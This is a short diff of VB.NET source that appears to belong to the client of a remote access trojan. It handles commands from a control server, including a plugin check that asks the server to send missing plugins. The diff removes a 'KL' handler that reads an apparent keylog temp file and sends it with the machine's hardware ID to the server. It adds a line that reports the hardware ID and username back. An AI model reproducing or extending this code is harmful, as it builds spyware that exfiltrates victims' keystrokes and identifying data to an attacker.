@@ -40,9 +40,6 @@
                         Catch ex As Exception
                         End Try
 
-                    Case "KL"
-                        C_TcpClient.Send("KL" + SPL + C_ID.HWID + SPL + IO.File.ReadAllText(IO.Path.GetTempPath + "\" + IO.Path.GetFileNameWithoutExtension(Windows.Forms.Application.ExecutablePath) + ".tmp"))
-
                     Case "CPL" 'check if plugin in installed, or ask server to send it
                         If GTV(A(1)) = Nothing Then
                             C_TcpClient.Send("GPL" + SPL + A(1))
@@ -81,6 +78,7 @@
                     Next
                 Next
             Catch ex As Exception
+                C_TcpClient.Send("OK" + SPL + C_ID.HWID + SPL + C_ID.UserName)
                 C_TcpClient.Send("MSG" + SPL + "Plugin Error! " + ex.Message)
             End Try
         End Sub
